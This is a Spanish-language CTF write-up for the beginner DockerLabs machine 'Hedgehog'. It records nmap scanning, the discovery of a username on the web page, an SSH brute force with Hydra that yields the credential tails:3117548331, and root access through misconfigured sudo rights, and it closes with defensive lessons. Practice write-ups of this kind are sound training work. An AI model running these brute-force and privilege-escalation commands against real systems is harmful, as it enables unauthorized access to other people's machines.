# Hedgehog - CTF Writeup

## 📋 Overview

**Hedgehog** es una máquina de dificultad muy fácil en DockerLabs que combina tres técnicas clave de pentesting:
1. Enumeración web para descubrir nombres de usuario
2. Ataque de fuerza bruta SSH
3. Escalada de privilegios mediante abuso de permisos `sudo`

---

## 🎯 Objetivos

- Obtener acceso inicial a través de SSH mediante fuerza bruta
- Realizar escalada lateral de `tails` a `sonic`
- Escalar verticalmente de `sonic` a `root`
- Lograr acceso total al sistema

---

## 🔑 Hallazgos Clave

### 1. **Enumeración Web**
- El servidor HTTP en puerto 80 expone el nombre de usuario `tails` en su contenido
- Esta información facilita significativamente el ataque de fuerza bruta SSH

### 2. **Credenciales Obtenidas**
- **tails:3117548331** — Obtenidas mediante ataque de fuerza bruta con Hydra
- Técnica: Se invirtió el orden del wordlist `rockyou.txt` para optimizar tiempos

### 3. **Configuración de Sudoers Débil**
- El usuario `tails` puede ejecutar **cualquier comando como `sonic`** sin contraseña
- El usuario `sonic` es miembro del grupo `sudo`, permitiendo escalar a root

---

## 🛠️ Técnicas Utilizadas

### Reconocimiento
```bash
# Verificación de conectividad
ping 172.17.0.2

# Escaneo de puertos exhaustivo
nmap -p- -sS -sV --min-rate 5000 -n -vvv -Pn 172.17.0.2
```

### Enumeración Web
```bash
# Obtener contenido de la página
curl -i http://172.17.0.2
```

### Ataque de Fuerza Bruta
```bash
# Optimización del wordlist
tac rockyou.txt | tr -d ' ' > rockyourev.txt

# Ataque con Hydra
hydra -l tails -P rockyourev.txt -v -t 4 ssh://172.17.0.2
```

### Escalada de Privilegios
```bash
# Escalada lateral: tails → sonic
sudo -u sonic /bin/bash

# Escalada vertical: sonic → root
sudo su
```

---

## 📊 Cadena de Explotación

```
172.17.0.2 (Puerto 80)
    ↓
Descubrir usuario: "tails"
    ↓
Fuerza bruta SSH (Hydra)
    ↓
tails:3117548331 (Acceso SSH)
    ↓
sudo -u sonic /bin/bash (Escalada lateral sin contraseña)
    ↓
sonic → root (Grupo sudo permite escalada)
    ↓
root (Acceso total al sistema)
```

---

## ⚠️ Vulnerabilidades Explotadas

1. **Exposición de información** — Nombre de usuario publicado en la web
2. **Contraseña débil** — `3117548331` presente en wordlists comunes
3. **Configuración sudoers insegura** — Permitir `NOPASSWD` para `sonic`
4. **Miembresía en grupo sudo** — Usuario `sonic` en grupo sudo sin restricciones

---

## 🚀 Lecciones Aprendidas

✅ La enumeración es crítica — Los detalles expuestos en servicios web pueden comprometer la seguridad  
✅ Las contraseñas débiles son vulnerables a ataques de diccionario  
✅ Los permisos `sudo` mal configurados son una vía rápida a root  
✅ Los grupos de sistema como `sudo` deben gestionarse con cuidado  

---

## 📌 Resumen de Credenciales

| Usuario | Contraseña | Método de Obtención |
|---------|-----------|-------------------|
| tails | 3117548331 | Hydra + rockyou.txt invertido |
| sonic | — | Escalada lateral sin contraseña |
| root | — | Acceso a través de grupo sudo |

---

## 📚 Referencias y Herramientas

- **Nmap** — Escaneo de puertos y servicios
- **Hydra** — Ataque de fuerza bruta SSH
- **Curl** — Enumeración web
- **SecLists** — Wordlists para ataques de diccionario

---

**Estado:** ✅ Completada  
**Fecha:** 2026-06-12  
**Plataforma:** DockerLabs  
**Dificultad:** ⭐ Muy fácil